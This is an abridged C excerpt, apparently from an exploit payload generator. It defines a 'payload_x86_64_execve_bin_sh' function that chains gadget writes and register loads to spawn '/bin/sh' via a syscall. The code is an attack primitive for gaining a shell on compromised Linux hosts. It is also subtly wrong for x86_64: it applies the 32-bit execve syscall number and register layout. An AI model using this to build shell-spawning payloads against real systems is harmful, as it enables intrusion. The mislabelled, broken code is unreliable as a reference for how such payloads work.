...
/* =========================================================================
   This file implement payloads for Linux x86_64
   ======================================================================= */
...
void payload_x86_64_execve_bin_sh(BINFMT *bin, const GLIST *src, PAYLOAD *dst) {
  ...
  gmake_x86_64_strcp(src, dst, data->addr, "/bin/sh");
  gmake_x86_64_setmem(src, dst, data->addr+8, data->addr);
  gmake_x86_64_setmem(src, dst, data->addr+12, 0);
  gmake_x86_64_setreg(src, dst, "rax", 11);
  gmake_x86_64_setreg(src, dst, "rbx", data->addr);
  gmake_x86_64_setreg(src, dst, "rcx", data->addr+8);
  gmake_x86_64_setreg(src, dst, "rdx", data->addr+12);
  gmake_x86_64_syscall(src, dst);
}
